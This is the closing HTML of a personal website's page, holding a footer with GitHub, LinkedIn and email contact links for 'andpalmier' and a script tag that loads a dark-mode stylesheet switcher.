    </li>
    
    
    
    <li>
	<a href="https://github.com/andpalmier/" aria-label="Github"  target="_blank" >
	    <i class="fab fa-github" aria-hidden="true"></i>
	</a>
    </li>
    
    
    
    <li>
	<a href="https://www.linkedin.com/in/andpalmier/" aria-label="LinkedIn"  target="_blank" >
	    <i class="fab fa-linkedin" aria-hidden="true"></i>
	</a>
    </li>
    
    
    
    <li>
	<a href="mailto:andpalmier@gmail.com" aria-label="Mail"  target="_blank" >
	    <i class="fas fa-envelope" aria-hidden="true"></i>
	</a>
    </li>
    
    
    
</ul>

    </section>
</footer>


	  </main>

    
      
        
        <script src="/js/dark-mode.min.aee9c8a464eb7b3534c7110f7c5e169e7039e2fd92710e0626d451d6725af137.js"></script>
      
    

	  

	  

	  

    </body>


</html>
